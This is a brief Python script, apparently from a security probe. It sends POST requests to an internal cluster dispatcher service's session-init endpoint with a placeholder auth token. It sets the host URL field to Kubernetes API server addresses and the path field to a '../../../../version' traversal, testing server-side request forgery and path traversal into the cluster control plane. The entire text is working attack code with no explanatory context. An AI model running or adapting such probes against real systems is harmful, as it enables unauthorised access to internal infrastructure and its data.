import json, urllib.request, urllib.error
base='http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local/session/init'
cases=[('dns80','http://kubernetes.default.svc','../../../../version'),('ip80','http://172.20.0.1','../../../../version'),('dns443http','http://kubernetes.default.svc:443','../../../../version'),('ip443http','http://172.20.0.1:443','../../../../version')]
for n,h,p in cases:
 b=json.dumps({'user_id':'probe-kube-http@armorerlabs.com','host_url':h,'project_path':p,'force':True}).encode()
 q=urllib.request.Request(base,b,method='POST',headers={'Content-Type':'application/json','X-SL-Token':'x'})
 try:
  x=urllib.request.urlopen(q,timeout=8); print(n,x.status,x.read(1000).decode('utf-8','replace'))
 except urllib.error.HTTPError as e: print(n,e.code,e.read(1000).decode('utf-8','replace'))
 except Exception as e: print(n,repr(e))
